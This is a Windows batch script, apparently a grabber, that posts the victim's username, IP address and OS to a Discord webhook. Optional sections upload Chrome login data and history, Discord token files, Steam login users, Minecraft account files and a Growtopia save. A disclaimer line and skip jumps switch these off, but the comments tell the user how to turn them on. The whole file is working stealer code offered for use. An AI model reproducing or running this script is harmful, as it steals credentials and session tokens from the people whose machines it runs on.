@echo off
:: BY REMOVING THE LINE 3 YOU AGREE TO NOT USE THE SCRIPT FOR MALICIOUS PURPOSES. THE AUTHOR OF THIS SCRIPT IS NOT RESPONSIBLE FOR ANY HARM CAUSED BY THE SCRIPT.
goto end
:: ^

:: SET WEBHOOK | EDIT TO YOUR OWN WEBHOOK
set "webhook=https://discord.com/api/webhooks/"

:: GET IP ADDRESS
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a

:: GET OS
for /f "delims=" %%a in ('ver ^| findstr /v "linux"') do @set os=%%a

:: START REPORT
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %NetworkIP%] \n%result% \n%os%\n%PROCESSOR_ARCHITECTURE%```\"}"  %webhook%

:: GROWTOPIA - REMOVE THE SKIP IF YOU WANT IT TO BE CAPTURED
goto skipgrowtopia
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"``` - GROWTOPIA -```\"}"  %webhook%
curl --silent --output /dev/null -F save.dat=@%localappdata%\Growtopia\save.dat %webhook%
:skipgrowtopia

:: CHROME - REMOVE THE SKIP IF YOU WANT IT TO BE CAPTURED
goto skipchrome
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME -```\"}"  %webhook%
curl --silent --output /dev/null -F History=@%localappdata%\Google\Chrome"\User Data"\Default\History %webhook%
curl --silent --output /dev/null -F Shortcuts=@%localappdata%\Google\Chrome"\User Data"\Default\Shortcuts %webhook%
curl --silent --output /dev/null -F Bookmarks=@%localappdata%\Google\Chrome"\User Data"\Default\Bookmarks %webhook%
curl --silent --output /dev/null -F Bookmarks=@%localappdata%\Google\Chrome"\User Data"\Default"\Login Data" %webhook%
:skipchrome

:: DISCORD - REMOVE THE SKIP IF YOU WANT IT TO BE CAPTURED
goto skipdiscord
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- DISCORD -```\"}"  %webhook%
for /f %%f in ('dir /b %appdata%\discord"\Local Storage"\leveldb\') do (
echo %%f|find ".ldb" >nul
if errorlevel 1 (@echo off) else (curl --silent --output /dev/null -F token.ldb=@%appdata%\discord"\Local Storage"\leveldb\%%f %webhook%)
)
:skipdiscord

:: STEAM - REMOVE THE SKIP IF YOU WANT IT TO BE CAPTURED
goto skipsteam
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- STEAM -```\"}"  %webhook%
curl --silent --output /dev/null -F steamusers=@C:"\Program Files (x86)"\Steam\config\loginusers.vdf %webhook%
curl --silent --output /dev/null -F steamusers=@C:"\Program Files"\Steam\config\loginusers.vdf %webhook%
:skipsteam

:: MINECRAFT - REMOVE THE SKIP IF YOU WANT IT TO BE CAPTURED
goto skipminecraft
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MINECRAFT -```\"}"  %webhook%
curl --silent --output /dev/null -F steamusers=@%appdata%\.minecraft\launcher_profiles.json %webhook%
curl --silent --output /dev/null -F steamusers=@%appdata%\.minecraft\launcher_accounts.json %webhook%
:skipminecraft

:: END REPORT
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```--- [END OF REPORT] ---```\"}"  %webhook%

:end
exit
